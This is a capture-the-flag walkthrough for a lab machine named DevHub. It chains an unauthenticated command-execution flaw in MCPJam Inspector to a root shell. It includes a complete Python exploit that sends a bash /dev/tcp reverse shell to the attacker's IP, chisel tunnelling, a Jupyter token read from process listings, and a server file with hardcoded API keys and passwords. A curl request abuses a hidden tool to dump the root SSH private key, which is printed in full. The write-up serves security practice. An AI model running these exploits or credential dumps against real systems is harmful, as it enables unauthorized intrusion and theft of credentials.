\-------------------------------------------------------------------------------------DevHub--------------------------------------------------------------------------------------------------





Step:-1- Reconnaissance



nmap -F 10.129.54.253



Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-07-11 06:08 UTC

Nmap scan report for devhub.htb (10.129.54.253)

Host is up (2.9s latency).

Not shown: 98 filtered tcp ports (no-response)

PORT   STATE SERVICE

22/tcp open  ssh

80/tcp open  http



Nmap done: 1 IP address (1 host up) scanned in 36.23 seconds



\[#] A Linux box! with HTTP and SSH! as ususal





\[#] The web address is **http://devhub.htb/**





\[#] While looking at the web page, it is a static HTML for developers, the web page itself gives us the lead!





\[#] it contains 3 things ----> 



&#x09;1. MCP Inspector - running at port 6274

&#x20;       2. Analytics Dashboard - internal only running at port 8888

&#x09;3. Code Repository - an internal git server







\----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------





Step:-2 Enumeraton and Inital Foothold :-





\[#] When i reached out the MCP inspector port running at 6274, and surfing the settings endpoint, i saw the **MCPJam Version: v1.4.2** 



\[#] Luckily, there was an RCE CVE for this version 





\[$] CVE-2026-23744 :- The /api/mcp/connect API, which is intended for connecting to MCP servers, becomes an open entry point for unauthorized requests. When an HTTP request reaches the /connect route, the system extracts the **command** and **args** fields without performing any security checks, leading to the execution of arbitrary command.





\[#] Also The MCP endpoint is listening on 0.0.0.0 all hosts, while it should be accessible locally, which makes this vulnerability in reach!





\[#] we can send a our shell commands inside the "command" and "args" parameter, to get the foothold!







\[#] Lets create a script, that will bind the reverse shell!





import requests



target = "http://devhub.htb:6274"

url = f'{target}/api/mcp/connect'



\# Replace with your tun0 / HTB VPN IP and your active netcat listener port

ip = "10.10.15.\*\*\*\*"

port = "5555"



data = {

&#x20;   "serverConfig": {

&#x20;       "command": "/bin/bash",

&#x20;       "args": \[

&#x20;           "-c",

&#x20;           f"/bin/bash -i >\& /dev/tcp/{ip}/{port} 0>\&1"

&#x20;       ],

&#x20;       "env": {}

&#x20;   },

&#x20;   "serverId": "stable\_mcp\_session"

}



print(f"\[\*] Dispatching persistent shell payload to {url}...")

print(f"\[\*] Check your 'nc -lvnp {port}' listener!")



try:

&#x20; 

&#x20;   response = requests.post(url, json=data, verify=False, timeout=None)

&#x20;   print(f"\[+] Server responded: {response.status\_code}")

&#x20;   print(response.text)

except requests.exceptions.ConnectionError:

&#x20;   print("\[+] Connection broken! This usually means the reverse shell took over successfully.")

except Exception as e:

&#x20;   print(f"\[-] Error: {e}")





&#x20;

\[#] Start the listener Before, running the script!





\[#] Trigger the request by executing the script 





python3 exploit.py

\[\*] Dispatching persistent shell payload to http://devhub.htb:6274/api/mcp/connect...

\[\*] Check your 'nc -lvnp 5555' listener!





\[#] And We should be able to see reverse shell on the listener 





nc -lvnp 5555                   

listening on \[any] 5555 ...

connect to \[10.10.15.136] from (UNKNOWN) \[10.129.54.253] 59776

bash: cannot set terminal process group (1049): Inappropriate ioctl for device

bash: no job control in this shell

mcp-dev@devhub:/opt/mcpjam/node\_modules/@mcpjam/inspector$ 





\--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------





Step:- 3 Privsec 





\[#] As we can see this is a docker container, with minimized command control. we need to pivot it 





\[#] From earlier Enumeration from the web page, we knew that there was an internal service running at port 8888 





mcp-dev@devhub:/opt/mcpjam/node\_modules/@mcpjam/inspector$ ss -tunlp

ss -tunlp

Netid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess  

&#x20;                                 

udp   UNCONN 0      0      127.0.0.53%lo:53        0.0.0.0:\*                                              

udp   UNCONN 0      0            0.0.0.0:68        0.0.0.0:\*                                              

tcp   LISTEN 0      511          0.0.0.0:6274      0.0.0.0:\*    users:(("node-MainThread",pid=1294,fd=29))

tcp   LISTEN 0      511          0.0.0.0:80        0.0.0.0:\*                                              

tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:\*                                              

**tcp   LISTEN 0      128        127.0.0.1:5000      0.0.0.0:\***                                              

tcp   LISTEN 0      4096   127.0.0.53%lo:53        0.0.0.0:\*                                              

**tcp   LISTEN 0      128        127.0.0.1:8888      0.0.0.0:\***  # The internal analytical dashboard!                                            

tcp   LISTEN 0      128             \[::]:22           \[::]:\*  





\[#] To see this we gotta tunnel it up via chisel!





\[#] lets setup server on our machine first



./chisel-lin server -p 8000 --reverse



2026/07/11 06:44:06 server: Reverse tunnelling enabled

2026/07/11 06:44:06 server: Fingerprint PD0f/mFKm4pVNS6Cz7utMrSlQJ2qnnuszQqCpc2erkQ=

2026/07/11 06:44:06 server: Listening on http://0.0.0.0:8000





\[#] Now there are only 2 ports seems to be interesting, port 5000 and port 8888



mcp-dev@devhub:/tmp$ ./chisel-lin client 10.10.15.\*\*\*\*:8000 R:5000:127.0.0.1:5000 R:8888:127.0.0.1:8888







\[#]Once they are connected, we should be able to access the web at port 8888





\[#] So after reaching the internal service, i saw that, that is a jupyter service's login page. which has basically 2 authentication methods



&#x09;1. Via password



&#x09;2. via authentication token 





\[#] So we somehow need to get one these thigs. 





\[#] As the machine is running internally, there should be at least some files, processes, or some sort of indication out there in the container!





mcp-dev@devhub:/opt/mcpjam/node\_modules/@mcpjam/inspector$ ls -la /home

ls -la /home

total 16

drwxr-xr-x  4 root    root    4096 Mar 16 21:25 .

drwxr-xr-x 20 root    root    4096 May 27 12:14 ..

drwxr-x---  9 analyst analyst 4096 May 27 12:22 analyst

drwxr-x---  4 mcp-dev mcp-dev 4096 May 27 12:22 mcp-dev



mcp-dev@devhub:/opt/mcpjam/node\_modules/@mcpjam/inspector$ ls /home/mcp-dev 

ls /home/mcp-dev



mcp-dev@devhub:/opt/mcpjam/node\_modules/@mcpjam/inspector$ ls /home/analyst

ls /home/analyst

ls: cannot open directory '/home/analyst': Permission denied

mcp-dev@devhub:/opt/mcpjam/node\_modules/@mcpjam/inspector$ 





\[#] there was nothing at the home directory, lets look for any process running named as "jupyter"





mcp-dev@devhub:/opt/mcpjam/node\_modules/@mcpjam/inspector$ ps aux | grep "jupyter"

<\_modules/@mcpjam/inspector$ ps aux | grep "jupyter"    

&#x20;  

analyst     1048  0.1  2.4 183076 97464 ?        Ss   06:05   0:05 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks **--ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7** --ServerApp.password= --ServerApp.allow\_origin= --ServerApp.disable\_check\_xsrf=False

root        1054  0.0  0.7  37376 28668 ?        Ss   06:05   0:01 /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py

mcp-dev     1565  0.0  0.0   3472  1716 ?        S    06:54   0:00 grep --color=auto jupyter





\[#] Jackpot! The auth key token is exposed in the process. that's all we needed!





\[#] Lets try getting in with this token 





\[#] Every Jupyter dashboard has in integrated internal, where we can access the whole server!







\[#] Lets get the flag!





analyst@devhub:\~$ id

uid=1002(analyst) gid=1002(analyst) groups=1002(analyst)





analyst@devhub:\~$ ls /home/analyst

jupyter-env  notebooks  user.txt











\[#] Now while enumerating i have found a directory in /opt



analyst@devhub:/opt$ ls

mcpjam  opsmcp



analyst@devhub:/opt$ cd opsmcp



analyst@devhub:/opt/opsmcp$ ls

server.py



analyst@devhub:/opt/opsmcp$ cat s\*



\#!/usr/bin/env python3

"""

OPSMCP - Operations MCP Server

Internal tool for system operations management

"""



from flask import Flask, jsonify, request

import os



app = Flask(\_\_name\_\_)



\# API Key for authentication

VALID\_API\_KEY = "opsmcp\_secret\_key\_4f5a6b7c8d9e0f1a"



\# Registered tools (visible)

VISIBLE\_TOOLS = {

&#x20;   "ops.system\_status": {

&#x20;       "description": "Get system status and health metrics",

&#x20;       "parameters": {}

&#x20;   },

&#x20;   "ops.list\_services": {

&#x20;       "description": "List running services",

&#x20;       "parameters": {}

&#x20;   },

&#x20;   "ops.check\_disk": {

&#x20;       "description": "Check disk usage",

&#x20;       "parameters": {}

&#x20;   },

&#x20;   "ops.view\_logs": {

&#x20;       "description": "View recent system logs",

&#x20;       "parameters": {"service": "string"}

&#x20;   }

}



\# Hidden tools (not in /tools/list but callable)

HIDDEN\_TOOLS = {

&#x20;   "ops.\_admin\_dump": {

&#x20;       "description": "Emergency credential dump - INTERNAL ONLY",

&#x20;       "parameters": {"target": "string", "confirm": "boolean"}

&#x20;   },

&#x20;   "ops.\_debug\_mode": {

&#x20;       "description": "Enable debug mode",

&#x20;       "parameters": {}

&#x20;   }

}



ALL\_TOOLS = {\*\*VISIBLE\_TOOLS, \*\*HIDDEN\_TOOLS}



def check\_auth():

&#x20;   """Check API key authentication"""

&#x20;   api\_key = request.headers.get('X-API-Key', '')

&#x20;   return api\_key == VALID\_API\_KEY



@app.route('/')

def index():

&#x20;   return jsonify({

&#x20;       "server": "OPSMCP",

&#x20;       "version": "2.1.0",

&#x20;       "status": "operational",

&#x20;       "endpoints": \["/tools/list", "/tools/call", "/health"],

&#x20;       "auth": "Required - X-API-Key header"

&#x20;   })



@app.route('/health')

def health():

&#x20;   return jsonify({"status": "healthy", "uptime": "14d 3h 22m"})



@app.route('/tools/list')

def list\_tools():

&#x20;   if not check\_auth():

&#x20;       return jsonify({"error": "Unauthorized", "message": "Valid X-API-Key header required"}), 401

&#x20;   

&#x20;   return jsonify({

&#x20;       "tools": list(VISIBLE\_TOOLS.keys()),

&#x20;       "count": len(VISIBLE\_TOOLS),

&#x20;       "details": VISIBLE\_TOOLS

&#x20;   })



@app.route('/tools/call', methods=\['POST'])

def call\_tool():

&#x20;   if not check\_auth():

&#x20;       return jsonify({"error": "Unauthorized", "message": "Valid X-API-Key header required"}), 401

&#x20;   

&#x20;   data = request.get\_json() or {}

&#x20;   tool\_name = data.get('name', '')

&#x20;   args = data.get('arguments', {})

&#x20;   

&#x20;   if not tool\_name:

&#x20;       return jsonify({"error": "Tool name required"}), 400

&#x20;   

&#x20;   if tool\_name not in ALL\_TOOLS:

&#x20;       return jsonify({"error": f"Unknown tool: {tool\_name}"}), 404

&#x20;   

&#x20;   # Execute tool

&#x20;   if tool\_name == "ops.system\_status":

&#x20;       return jsonify({

&#x20;           "cpu": "23%",

&#x20;           "memory": "1.2GB/4GB",

&#x20;           "load": "0.45",

&#x20;           "status": "nominal"

&#x20;       })

&#x20;   

&#x20;   elif tool\_name == "ops.list\_services":

&#x20;       return jsonify({

&#x20;           "services": \[

&#x20;               {"name": "nginx", "status": "running", "pid": 1234},

&#x20;               {"name": "opsmcp", "status": "running", "pid": 5678},

&#x20;               {"name": "jupyter", "status": "running", "pid": 9012},

&#x20;               {"name": "mcpjam", "status": "running", "pid": 3456}

&#x20;           ]

&#x20;       })

&#x20;   

&#x20;   elif tool\_name == "ops.check\_disk":

&#x20;       return jsonify({

&#x20;           "filesystems": \[

&#x20;               {"mount": "/", "used": "4.2G", "available": "15G", "percent": "22%"},

&#x20;               {"mount": "/home", "used": "1.1G", "available": "8G", "percent": "12%"}

&#x20;           ]

&#x20;       })

&#x20;   

&#x20;   elif tool\_name == "ops.view\_logs":

&#x20;       service = args.get('service', 'system')

&#x20;       return jsonify({

&#x20;           "service": service,

&#x20;           "logs": \[

&#x20;               "\[2026-01-22 10:00:01] Service started",

&#x20;               "\[2026-01-22 10:00:02] Listening on configured port",

&#x20;               "\[2026-01-22 10:15:33] Health check passed",

&#x20;               "\[2026-01-22 11:00:00] Routine maintenance completed"

&#x20;           ]

&#x20;       })

&#x20;   

&#x20;   elif tool\_name == "ops.\_debug\_mode":

&#x20;       return jsonify({

&#x20;           "debug": True,

&#x20;           "message": "Debug mode enabled",

&#x20;           "hidden\_tools": list(HIDDEN\_TOOLS.keys()),

&#x20;           "note": "Debug endpoints now accessible"

&#x20;       })

&#x20;   

&#x20;   elif tool\_name == "ops.\_admin\_dump":

&#x20;       target = args.get('target', '')

&#x20;       confirm = args.get('confirm', False)

&#x20;       

&#x20;       if not confirm:

&#x20;           return jsonify({

&#x20;               "error": "Confirmation required",

&#x20;               "usage": "Set confirm=true to proceed",

&#x20;               "warning": "This dumps sensitive credentials"

&#x20;           })

&#x20;       

&#x20;       if target == "ssh\_keys":

&#x20;           try:

&#x20;               with open('/root/.ssh/id\_rsa', 'r') as f:

&#x20;                   key\_data = f.read()

&#x20;               return jsonify({

&#x20;                   "target": "ssh\_keys",

&#x20;                   "root\_private\_key": key\_data,

&#x20;                   "note": "Emergency recovery key dump"

&#x20;               })

&#x20;           except Exception as e:

&#x20;               return jsonify({

&#x20;                   "target": "ssh\_keys",

&#x20;                   "error": f"Could not read key: {str(e)}"

&#x20;               })

&#x20;       

&#x20;       elif target == "passwords":

&#x20;           return jsonify({

&#x20;               "target": "passwords",

&#x20;               "dump": {

&#x20;                   "root": "$6$rounds=656000$saltsalt$hashedpassword",

&#x20;                   "analyst": "JupyterN0tebook!2026",

&#x20;                   **"mcp-dev": "Mcp!Insp3ct0r2026"**

&#x20;               }

&#x20;           })

&#x20;       

&#x20;       elif target == "tokens":

&#x20;           return jsonify({

&#x20;               "target": "tokens",

&#x20;               "api\_tokens": {

&#x20;                   **"admin\_token": "opsmcp\_admin\_7f3b9c2d1e4f5a6b",**

&#x20;                   "service\_token": "opsmcp\_svc\_8c9d0e1f2a3b4c5d"

&#x20;               }

&#x20;           })

&#x20;       

&#x20;       else:

&#x20;           return jsonify({

&#x20;               "error": "Invalid target",

&#x20;               "valid\_targets": \["ssh\_keys", "passwords", "tokens"]

&#x20;           })

&#x20;   

&#x20;   return jsonify({"error": "Tool execution failed"}), 500



if \_\_name\_\_ == '\_\_main\_\_':

&#x20;   app.run(host='127.0.0.1', port=5000, debug=False)



&#x20;



\[#] This script is a jackpot, it exposed everything towards gaining an upper hand!



\[#] It exposed  **VALID\_API\_KEY = "opsmcp\_secret\_key\_4f5a6b7c8d9e0f1a"**, which we will used to access the targets  among "valid\_targets": \[**"ssh\_keys"**, "passwords", "tokens"]



\[#] The script has a tool called ops.\_admin\_dump which runs a backdore, that read root ssh keys 





\[#] Now where are we gonna send this request ? - remember we tunneled port 5000, lets look what it has!



&#x09;

auth	"Required - X-API-Key header"

endpoints	

0	"/tools/list"

1	"/tools/call"

2	"/health"

server	"OPSMCP"

status	"operational"

version	"2.1.0"



\[#] The request gave me a json output, that says it requires  X-API-Key header. means this is the lead to access those root ssh keys!





\[#] We prepare a post request with valid api key in header, asking for ssh as target!





mcp-dev@devhub:/opt/mcpjam/node\_modules/@mcpjam/inspector$ curl -X POST http://127.0.0.1:5000/tools/call \\

&#x20; -H "Content-Type: application/json" \\

&#x20; -H "X-API-Key: opsmcp\_secret\_key\_4f5a6b7c8d9e0f1a" \\

&#x20; -d '{"name": "ops.\_admin\_dump", "arguments": {"target": "ssh\_keys", "confirm": true}}'



<or$ curl -X POST http://127.0.0.1:5000/tools/call \\       

>   -H "Content-Type: application/json" \\

>   -H "X-API-Key: opsmcp\_secret\_key\_4f5a6b7c8d9e0f1a" \\

<guments": {"target": "ssh\_keys", "confirm": true}}'

&#x20; % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current

&#x20;                                Dload  Upload   Total   Spent    Left  Speed

&#x20; 0     0    0     0    0     0      0      0100  2000  100  1919  100    81   173k   7510 --:--:-- --:--:-- --:--:--  217k

{"note":"Emergency recovery key dump","root\_private\_key":**"-----BEGIN OPENSSH PRIVATE KEY-----\\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\\nNhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9\\nG/jqltqP312IONAX9LwvTne81E4h+hi2xdjwgvh27iE4AvCQolR8S0GWHwHQjjXVQ5/dHX\\n8MA96Qabow623zQe5D6PUAsFj6aWP5fDceIziAxkLIMgpsE6I0bWOKaGmgEG0rW1I/mw8z\\n6HmooVORQsQoTaVUhnUmRJRcLpQEu94hzb+0kQ0ObKikcDTnit1kQ/7ZUOoyGhUgEwVk/n\\nGhm2D96OW/JLpMIowwDxnka+3l9u5Aj55Y9fWN9aGld5pVvcoPRZ7twODIbXNSjzWsLQRQ\\n7l8/a2M+aQAAA8BGnYWeRp2FngAAAAdzc2gtcnNhAAABAQDBYfDgi/zIPDKo5pw7m4HY4W\\nv9FoPVMXX3am2Ale7S+PlJPKk5Qf0b+OqW2o/fXYg40Bf0vC9Od7zUTiH6GLbF2PCC+Hbu\\nITgC8JCiVHxLQZYfAdCONdVDn90dfwwD3pBpujDrbfNB7kPo9QCwWPppY/l8Nx4jOIDGQs\\ngyCmwTojRtY4poaaAQbStbUj+bDzPoeaihU5FCxChNpVSGdSZElFwulAS73iHNv7SRDQ5s\\nqKRwNOeK3WRD/tlQ6jIaFSATBWT+caGbYP3o5b8kukwijDAPGeRr7eX27kCPnlj19Y31oa\\nV3mlW9yg9Fnu3A4Mhtc1KPNawtBFDuXz9rYz5pAAAAAwEAAQAAAQAjgZkZkXpjRXJDwrvS\\n0fWgXZtXR8gC3+b5+4eJgX3tLJuQz9t+UNhpR2XDNvQNnf3B+Ks9W0QQUznPfV0Nr3X3k6\\nJtWbN0e5LuLz9PHtYHd05Z+RpS0h2LIhIWNVp+Z2H6l54dy/1LELVVU47B0kSAD0Qig3g8\\nHUa/oEljrrgzTlYflRHhkHQblmd9ZaClUoxIDh0zf2Esmp3nIRBm4J1OX5UQPiPEa7/LkB\\ndcQr1K4Z1pbZglc5wPUJZCv8MtVPvW9rCgERl9Sl4bKevsgS4mMMUvVxNdqyasYqNAXi/L\\nCvk9YYP9PS4q1dfCYMIvsJJNyoBtUiCJwqW2ba6hs1vVAAAAgDEPkj6UOdX1B872cHrja2\\nnkahzlja7GZw3G2+hsib4kH/G1nwQs9RRtnzqf/mrXeEhxB27ZN+QE39e7yTC3r6f84mSn\\nMz/gS3Czh6DtP+S18jV4xCeac/SoLuxgLvPZ3xnHWvPO6HePQzyVlVk/MBfp+yPrCpIiHK\\nMtVMaeJXFYAAAAgQDSlTQAPhkFhsswOcohRO+1hd/4xdD9UECem1ytsb5/on47/GEWvtQI\\noocmAAMvEYlOvs8GXeYkMBAwi5VCjLunNBCmuRMjTEgE7lqgdhfkK0Lx/a4BWnYaki+xbk\\nJt9XB5f2NlmnT4A5QqiO+qPYA2i1iF9CSv5ypxqHFChgMZNwAAAIEA6xcR6lBjwgtKuzRQ\\nnI+f8DFRxcdfKY1gs0BmfS0RRxwDzIEwJHYafyHnq/CKBTDPCYyn/VI+mF64hhtjUbDgAr\\nC8X6q/4LJecp3piSHgv6yXhpzkxtz+Q/JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK\\nlFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=\\n-----END OPENSSH PRIVATE KEY-----\\n"**,"target":"ssh\_keys"} 







\[#] we successfully extracted the root ssh keys 



\[#] Now clean the literals and save it in a file 



echo -e "-----BEGIN OPENSSH PRIVATE KEY-----\\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\\nNhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9\\nG/jqltqP312IONAX9LwvTne81E4h+hi2xdjwgvh27iE4AvCQolR8S0GWHwHQjjXVQ5/dHX\\n8MA96Qabow623zQe5D6PUAsFj6aWP5fDceIziAxkLIMgpsE6I0bWOKaGmgEG0rW1I/mw8z\\n6HmooVORQsQoTaVUhnUmRJRcLpQEu94hzb+0kQ0ObKikcDTnit1kQ/7ZUOoyGhUgEwVk/n\\nGhm2D96OW/JLpMIowwDxnka+3l9u5Aj55Y9fWN9aGld5pVvcoPRZ7twODIbXNSjzWsLQRQ\\n7l8/a2M+aQAAA8BGnYWeRp2FngAAAAdzc2gtcnNhAAABAQDBYfDgi/zIPDKo5pw7m4HY4W\\nv9FoPVMXX3am2Ale7S+PlJPKk5Qf0b+OqW2o/fXYg40Bf0vC9Od7zUTiH6GLbF2PCC+Hbu\\nITgC8JCiVHxLQZYfAdCONdVDn90dfwwD3pBpujDrbfNB7kPo9QCwWPppY/l8Nx4jOIDGQs\\ngyCmwTojRtY4poaaAQbStbUj+bDzPoeaihU5FCxChNpVSGdSZElFwulAS73iHNv7SRDQ5s\\nqKRwNOeK3WRD/tlQ6jIaFSATBWT+caGbYP3o5b8kukwijDAPGeRr7eX27kCPnlj19Y31oa\\nV3mlW9yg9Fnu3A4Mhtc1KPNawtBFDuXz9rYz5pAAAAAwEAAQAAAQAjgZkZkXpjRXJDwrvS\\n0fWgXZtXR8gC3+b5+4eJgX3tLJuQz9t+UNhpR2XDNvQNnf3B+Ks9W0QQUznPfV0Nr3X3k6\\nJtWbN0e5LuLz9PHtYHd05Z+RpS0h2LIhIWNVp+Z2H6l54dy/1LELVVU47B0kSAD0Qig3g8\\nHUa/oEljrrgzTlYflRHhkHQblmd9ZaClUoxIDh0zf2Esmp3nIRBm4J1OX5UQPiPEa7/LkB\\ndcQr1K4Z1pbZglc5wPUJZCv8MtVPvW9rCgERl9Sl4bKevsgS4mMMUvVxNdqyasYqNAXi/L\\nCvk9YYP9PS4q1dfCYMIvsJJNyoBtUiCJwqW2ba6hs1vVAAAAgDEPkj6UOdX1B872cHrja2\\nnkahzlja7GZw3G2+hsib4kH/G1nwQs9RRtnzqf/mrXeEhxB27ZN+QE39e7yTC3r6f84mSn\\nMz/gS3Czh6DtP+S18jV4xCeac/SoLuxgLvPZ3xnHWvPO6HePQzyVlVk/MBfp+yPrCpIiHK\\nMtVMaeJXFYAAAAgQDSlTQAPhkFhsswOcohRO+1hd/4xdD9UECem1ytsb5/on47/GEWvtQI\\noocmAAMvEYlOvs8GXeYkMBAwi5VCjLunNBCmuRMjTEgE7lqgdhfkK0Lx/a4BWnYaki+xbk\\nJt9XB5f2NlmnT4A5QqiO+qPYA2i1iF9CSv5ypxqHFChgMZNwAAAIEA6xcR6lBjwgtKuzRQ\\nnI+f8DFRxcdfKY1gs0BmfS0RRxwDzIEwJHYafyHnq/CKBTDPCYyn/VI+mF64hhtjUbDgAr\\nC8X6q/4LJecp3piSHgv6yXhpzkxtz+Q/JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK\\nlFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=\\n-----END OPENSSH PRIVATE KEY-----" > root.key







\[#] Set permissions 



chmod 600 root.key







\[#] Now just simply Login via SSH!



root@devhub:\~# id

uid=0(root) gid=0(root) groups=0(root)



root@devhub:\~# ls -la /root/root.txt

\-rw-r----- 1 root root 33 Jul 11 06:06 /root/root.txt

&#x20;



\[#] Server Pawned!



\[#] tbh, this machine is the easiest machine in the whole season!









